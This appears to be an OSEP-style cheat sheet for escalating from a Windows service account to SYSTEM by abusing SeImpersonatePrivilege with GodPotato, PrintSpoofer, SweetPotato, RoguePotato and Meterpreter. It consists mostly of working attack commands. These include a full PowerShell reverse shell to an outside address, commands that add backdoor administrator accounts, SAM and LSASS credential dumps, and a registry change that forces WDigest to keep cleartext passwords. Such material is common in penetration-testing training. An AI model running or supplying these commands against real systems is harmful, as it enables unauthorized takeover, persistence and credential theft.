# Token Impersonation & SeImpersonatePrivilege Exploitation

**This is the most common OSEP privilege escalation path.** When you compromise a service account (IIS App Pool, MSSQL service, Network Service, Local Service), it almost always has `SeImpersonatePrivilege`. This lets you impersonate any token that connects to a named pipe you control — including SYSTEM tokens.

---

## Identify the Privilege

```powershell
whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"
# If ENABLED → you can escalate to SYSTEM
```

**Accounts that commonly have SeImpersonatePrivilege:**
- `IIS APPPOOL\*` — Every IIS application pool identity
- `NT AUTHORITY\Network Service` — MSSQL default, WCF services
- `NT AUTHORITY\Local Service`
- Any service account running as a non-admin Windows service

---

## Tool Decision Tree

```
SeImpersonatePrivilege is ENABLED...
│
├── Windows 10/11 or Server 2019/2022?
│   └── GodPotato (most modern, highest success rate)
│
├── Windows Server 2016/2019 or Win10 1903+?
│   └── PrintSpoofer (named pipe + SpoolSample coercion)
│
├── Windows Server 2016 or older?
│   └── SweetPotato or JuicyPotato
│
└── Can't drop binary? Have Meterpreter session?
    └── load incognito → impersonate_token "NT AUTHORITY\\SYSTEM"
```

---

## Method 1: GodPotato (Windows 10/11 + Server 2019/2022)

GodPotato uses DCOM activation + named pipe impersonation. Works where JuicyPotato fails (post-CLSID randomization).

```powershell
# Drop to target: GodPotato-NET4.exe
# (binary should be in this directory or loaded via Invoke-SharpLoader)

# Run a command as SYSTEM
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# Spawn a reverse shell as SYSTEM (catch on Kali with nc -lvp 4444)
.\GodPotato-NET4.exe -cmd "cmd /c powershell -w hidden -enc <BASE64_REVERSE_SHELL>"

# Add a local admin
.\GodPotato-NET4.exe -cmd "cmd /c net user backdoor Pass123! /add && net localgroup administrators backdoor /add"

# Execute your loader (gets you a SYSTEM meterpreter)
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\loader.exe"
```

---

## Method 2: PrintSpoofer (Windows Server 2016/2019, Win10)

PrintSpoofer tricks the Print Spooler service into connecting to a named pipe owned by you. Spooler runs as SYSTEM → you impersonate its token.

```powershell
# If you have the C# source (PrintSpooferNet from OSEP course notes):
# Compile (Visual Studio, Windows dev box):
#   File → New → Console App (.NET Framework), name "PrintSpooferNet", .NET Framework 4.8
#   Paste PrintSpooferNet.cs, Project → Properties → Build → Platform target: x64
#   Build → Build Solution → output: bin\x64\Debug\PrintSpooferNet.exe
# Alt: csc.exe /unsafe /platform:x64 /out:PrintSpooferNet.exe PrintSpooferNet.cs

# Or use the pre-compiled PrintSpoofer.exe

# Run interactive SYSTEM shell (requires interactive session):
.\PrintSpoofer.exe -i -c cmd.exe

# Non-interactive — run a command:
.\PrintSpoofer.exe -c "cmd /c whoami > C:\Windows\Temp\out.txt"

# Reverse shell:
.\PrintSpoofer.exe -c "powershell -w hidden -c \"\$c=New-Object Net.Sockets.TCPClient('192.168.45.202',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$ob=[text.encoding]::ASCII.GetBytes(\$o+' PS> ');\$s.Write(\$ob,0,\$ob.Length)};\$c.Close()\""

# Via Meterpreter (if you uploaded it):
meterpreter> execute -f PrintSpoofer.exe -a "-i -c cmd.exe" -H
```

---

## Method 3: SweetPotato (Server 2016 and older, broadest compatibility)

SweetPotato combines multiple impersonation techniques (Juicy + PrintSpoofer + DCOM) into one tool.

```powershell
# Basic SYSTEM command execution:
.\SweetPotato.exe -a "cmd /c whoami"

# Reverse shell:
.\SweetPotato.exe -a "powershell -w hidden -enc <BASE64>"

# Load a shellcode runner:
.\SweetPotato.exe -a "C:\Windows\Temp\loader.exe"
```

---

## Method 4: Meterpreter — Incognito (No Binary Drop)

If you already have a Meterpreter session as a service account:

```
meterpreter> getprivs                            # verify SeImpersonatePrivilege
meterpreter> load incognito
meterpreter> list_tokens -u                      # find available tokens
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter> getuid                              # confirm
meterpreter> getsystem                           # try auto-escalation first
meterpreter> migrate <SYSTEM_PID>               # migrate into SYSTEM process
```

---

## Method 5: RoguePotato (NTLM relay variant, needs Kali listener)

RoguePotato relays the DCOM NTLM auth to your Kali machine, then back to an arbitrary endpoint. Useful when other methods fail.

```bash
# Kali: start socat relay
socat TCP-LISTEN:9999,fork,reuseaddr TCP:127.0.0.1:9998 &

# Kali: start ntlmrelayx targeting the victim's localhost
python3 ntlmrelayx.py -t ldap://127.0.0.1 -smb2support --no-wcf-server --escalate-user <YOUR_USER>

# Victim: run RoguePotato
.\RoguePotato.exe -r 192.168.45.202 -e "cmd /c whoami > C:\out.txt" -l 9999
```

---

## After Getting SYSTEM — Next Steps

```powershell
# From SYSTEM cmd/PS:

# Dump SAM for local hashes
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

# If LSASS is dumpable (no RunAsPPL):
$lsassPid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full

# Enable WDigest for cleartext password capture on next login:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# (Take effect on next login — useful for persistence + later dump)

# Add a backdoor admin:
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Spawn a SYSTEM Meterpreter (if you have a handler ready):
C:\Windows\Temp\loader.exe
```

---

## WDigest — Enable Cleartext Password Capture

Even if you get SYSTEM but no immediate creds, enable WDigest so the next time any user logs in, their password is stored in cleartext in LSASS.

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

Then wait for a logon event (or force one: lock/unlock screen, scheduled task, service restart). Dump LSASS again to get cleartext.

---

## Detection Check

```powershell
# Does LSASS have PPL protection? (blocks most dumps)
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL
# 1 = protected — need mimidrv.sys or Kernel PPL bypass

# Is Credential Guard active? (blocks NTLM hash extraction from LSASS)
(Get-WmiObject -Class Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
# 2 = Credential Guard running — Mimikatz sekurlsa will return no hashes

# Check both at once:
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
```
